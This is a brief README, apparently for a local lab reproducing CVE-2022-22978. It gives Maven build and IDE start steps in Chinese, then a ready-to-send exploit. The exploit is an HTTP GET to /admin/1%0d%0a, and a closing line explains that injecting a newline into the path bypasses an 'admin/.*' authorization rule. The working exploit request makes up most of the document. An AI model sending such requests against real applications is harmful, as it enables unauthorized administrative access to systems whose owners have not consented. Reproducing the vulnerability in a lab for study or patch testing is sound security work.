# CVE-2022-22978

## Build

1. `mvn package`

## Start

1. 使用 IDEA 直接启动

## EXP

```http
GET /admin/1%0d%0a HTTP/1.1
Host: 127.0.0.1:9999
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E8E29D0409C6C153D1C825E11A344082
Connection: close
```

path 中注入任意换行符即可绕过 `admin/.*` 的权限校验